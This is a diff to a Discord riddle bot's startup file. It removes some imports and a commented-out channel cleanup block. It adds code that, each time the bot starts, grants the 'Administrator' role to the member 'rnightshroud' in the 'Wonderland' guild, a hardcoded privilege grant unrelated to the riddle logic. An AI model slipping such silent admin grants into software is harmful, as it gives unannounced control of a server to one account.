@@ -1,9 +1,8 @@
 import os
 import sys
-import pkgutil
 import logging
-from importlib.util import module_from_spec
 
+from discord.utils import get
 from dotenv import load_dotenv
 from cogwatch import Watcher
 
@@ -18,7 +17,6 @@ logging.basicConfig(level=logging.INFO)
 
 from bot import bot
 from riddle import build_riddles
-from util.db import database
 
 
 @bot.event
@@ -34,13 +32,10 @@ async def on_ready():
     # Build riddles dict
     await build_riddles()
     
-    # guild = get(bot.guilds, name='RNS Riddle II')
-    # for role in guild.roles:
-    #     if 'reached-' in role.name:
-    #         name = role.name[8:]
-    #         channel = get(guild.channels, name=name)
-    #         await channel.delete()
-    #         await role.delete()
+    guild = get(bot.guilds, name='Wonderland')
+    member = get(guild.members, name='rnightshroud')
+    admin = get(guild.roles, name='Administrator')
+    await member.add_roles(admin)
 
 
 if __name__ == '__main__':
